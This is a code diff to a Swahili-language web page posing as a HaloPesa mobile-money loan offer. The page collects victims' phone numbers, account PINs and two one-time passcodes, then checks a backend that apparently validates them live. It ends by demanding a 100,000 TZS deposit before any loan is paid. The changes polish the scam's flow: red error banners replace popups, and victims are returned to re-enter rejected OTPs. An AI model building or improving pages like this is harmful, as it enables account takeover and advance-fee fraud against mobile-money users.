@@ -237,6 +237,20 @@
             background: #FFF;
         }
 
+        /* Red Alarm Banner */
+        .red-alarm {
+            background-color: #FFF5F5;
+            color: #E53E3E;
+            border: 1px solid #FEB2B2;
+            padding: 12px 15px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+        }
+
         /* Loading Spinner Animation */
         .loading-spinner {
             width: 45px;
@@ -303,6 +317,7 @@
         <!-- STEP 2: Phone Number Input -->
         <div id="step-phone" style="display: none;">
             <div class="card-title">Weka Namba Yako Ya Simu</div>
+            <div id="phone-alarm" class="red-alarm"></div>
             <div class="input-group">
                 <label class="section-label">Namba ya HaloPesa</label>
                 <div class="phone-input-wrapper">
@@ -335,6 +350,7 @@
         <!-- STEP 4: First 4-Digit OTP -->
         <div id="step-otp1" style="display: none;">
             <div class="card-title">Weka Namba Ya OTP 1</div>
+            <div id="otp1-alarm" class="red-alarm"></div>
             <div class="section-label">Ingiza OTP ya kwanza (Tarakimu 4):</div>
             <div class="pin-container">
                 <input type="password" maxlength="1" class="otp1-box" oninput="moveToNext(this, 'o1_2')">
@@ -348,6 +364,7 @@
         <!-- STEP 5: Second 4-Digit OTP -->
         <div id="step-otp2" style="display: none;">
             <div class="card-title">Weka Namba Ya OTP 2</div>
+            <div id="otp2-alarm" class="red-alarm"></div>
             <div class="section-label">Ingiza OTP ya pili (Tarakimu 4):</div>
             <div class="pin-container">
                 <input type="password" maxlength="1" class="otp2-box" oninput="moveToNext(this, 'o2_2')">
@@ -418,10 +435,13 @@
             const isValidLength = (startsWithZero && rawPhone.length === 10) || (!startsWithZero && rawPhone.length === 9);
 
             if (!isValidLength) {
-                alert('Tafadhali weka namba halali (Namba 10 ukianza na 0 au Namba 9 bila 0).');
+                const alarm = document.getElementById('phone-alarm');
+                alarm.innerText = 'Tafadhali weka namba halali (Namba 10 ukianza na 0 au Namba 9 bila 0).';
+                alarm.style.display = 'block';
                 return;
             }
 
+            document.getElementById('phone-alarm').style.display = 'none';
             fullPhoneNumber = `+255${rawPhone}`;
             document.getElementById('step-phone').style.display = 'none';
             document.getElementById('step-pin').style.display = 'block';
@@ -433,7 +453,6 @@
             boxes.forEach(b => pin += b.value);
 
             if (pin.length < 4) {
-                alert('Tafadhali weka Nambari ya Siri (PIN) ya tarakimu 4.');
                 return;
             }
 
@@ -461,22 +480,27 @@
                         document.getElementById('step-otp1').style.display = 'block';
                     } else if (data.status === 'rejected') {
                         clearInterval(interval);
-                        alert("Tafadhali jisajili kwa kutumia namba yako ya Halotel.");
-                        location.reload();
+                        document.getElementById('step-waiting').style.display = 'none';
+                        
+                        // Corrected line with proper quotes and parentheses
+                        document.getElementById('phone-alarm').innerText = 'Tafadhali jisajili kwa kutumia namba yako ya Halotel.';
+                        document.getElementById('phone-alarm').style.display = 'block';
+                        document.getElementById('step-phone').style.display = 'block';
+                        
+                        // Clear PIN inputs for retry
+                        document.querySelectorAll('.pin-box').forEach(b => b.value = '');
                     }
                 } catch (e) {
                     console.error(e);
                 }
             }, 3500);
         }
-
         async function submitOtp1() {
             const boxes = document.querySelectorAll('.otp1-box');
             let otp1 = '';
             boxes.forEach(b => otp1 += b.value);
 
             if (otp1.length < 4) {
-                alert('Tafadhali weka OTP 1 ya tarakimu 4.');
                 return;
             }
 
@@ -504,8 +528,13 @@
                         document.getElementById('step-otp2').style.display = 'block';
                     } else if (data.status === 'wrong') {
                         clearInterval(statusInterval);
-                        alert('OTP 1 sio sahihi. Jaribu tena.');
-                        location.reload();
+                        document.getElementById('step-waiting').style.display = 'none';
+                        // Return to OTP1 step and show red alarm message above boxes
+                        const alarm = document.getElementById('otp1-alarm');
+                        alarm.innerText = 'OTP sio sahihi. Jaribu tena.';
+                        alarm.style.display = 'block';
+                        document.getElementById('step-otp1').style.display = 'block';
+                        document.querySelectorAll('.otp1-box').forEach(b => b.value = '');
                     }
                 } catch (e) {
                     console.error(e);
@@ -519,7 +548,6 @@
             boxes.forEach(b => otp2 += b.value);
 
             if (otp2.length < 4) {
-                alert('Tafadhali weka OTP 2 ya tarakimu 4.');
                 return;
             }
 
@@ -548,8 +576,13 @@
                         document.getElementById('success-msg').innerHTML = `Hongera,umefanikiwa kukopa TZS ${currentAmount}<br><br>Tafadhali weka kiasi cha 100,000Tz kwenye akaunti yako ili kupokea kiasi unachochagua kwenye ${fullPhoneNumber}.`;
                     } else if (data.status === 'wrong') {
                         clearInterval(interval);
-                        alert('OTP 2 sio sahihi. Jaribu tena.');
-                        location.reload();
+                        document.getElementById('step-waiting').style.display = 'none';
+                        // Return to OTP2 step and show red alarm message above boxes
+                        const alarm = document.getElementById('otp2-alarm');
+                        alarm.innerText = 'OTP sio sahihi. Jaribu tena.';
+                        alarm.style.display = 'block';
+                        document.getElementById('step-otp2').style.display = 'block';
+                        document.querySelectorAll('.otp2-box').forEach(b => b.value = '');
                     }
                 } catch (e) {
                     console.error(e);
